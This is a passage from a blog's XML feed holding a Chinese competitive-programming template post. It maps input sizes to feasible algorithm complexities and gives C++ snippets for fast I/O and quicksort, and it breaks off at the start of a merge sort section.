          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法题模板</title>
      <link href="/2024/03/20/algorithm/"/>
      <url>/2024/03/20/algorithm/</url>
      
        <content type="html"><![CDATA[<h1>CSP资料</h1><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>30</mn></mrow><annotation encoding="application/x-tex">n\leqslant30</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">0</span></span></span></span> :  指数级别, dfs+剪枝，状态压缩dp</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>100</mn><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant100 ==&gt; O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> : floyd，dp，高斯消元</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>1000</mn><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant1000 ==&gt; O(n^2), O(n^2logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> : dp，二分，朴素版Dijkstra、朴素版Prim、Bellman-Ford</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>10000</mn><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>∗</mo><msqrt><mi>n</mi></msqrt><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant10000 ==&gt; O(n * \sqrt n), O(n^2logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="padding-left:0.833em;">n</span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> : 块状链表、分块、莫队</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>100000</mn><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant100000 ==&gt; O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> : 各种sort，线段树、树状数组、set/map、heap、拓扑排序、dijkstra+heap、prim+heap、Kruskal、spfa、求凸包、求半平面交、二分、CDQ分治、整体二分、后缀数组、树链剖分、动态树</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>1000000</mn><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>以及常数较小的</mtext><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo><mtext>算法</mtext></mrow><annotation encoding="application/x-tex">n\leqslant1000000 ==&gt; O(n), 以及常数较小的 O(nlogn)算法</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">及</span><span class="mord cjk_fallback">常</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">较</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">法</span></span></span></span> ：单调队列、 hash、双指针扫描、BFS、并查集，kmp、AC自动机，常数比较小的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>的做法：sort、树状数组、heap、dijkstra、spfa</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>10000000</mn><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant10000000 ==&gt; O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> : 双指针扫描、kmp、AC自动机、线性筛素数</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><msqrt><mi>n</mi></msqrt><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant10^9 ==&gt; O(\sqrt n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.05028em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="padding-left:0.833em;">n</span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 判断质数</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant10^{18} ==&gt; O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> : 最大公约数，快速幂，数位DP</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>1</mn><msup><mn>0</mn><mn>1000</mn></msup><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n\leqslant10^{1000} ==&gt; O((logn)^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> : 高精度加减乘除</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mn>1</mn><msup><mn>0</mn><mn>100000</mn></msup><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo>∗</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo stretchy="false">)</mo><mi>k</mi><mtext>表示位数</mtext></mrow><annotation encoding="application/x-tex">n\leqslant10^{100000} ==&gt; O(logk * loglogk) k表示位数</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">数</span></span></span></span> ：高精度加减、FFT/NTT</p><p><strong>万能头文件</strong>：<code>#include &lt;bits/stdc++.h&gt;</code></p><p><strong>快速输入输出</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    std::cout.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    程序主体</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="排序">排序</h2><h3 id="快速排序">快速排序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = q[l + r &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i ++ ; <span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j -- ; <span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(q[i], q[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">quick_sort</span>(q, l, j), <span class="built_in">quick_sort</span>(q, j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序-求逆序对数量">归并排序（求逆序对数量）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 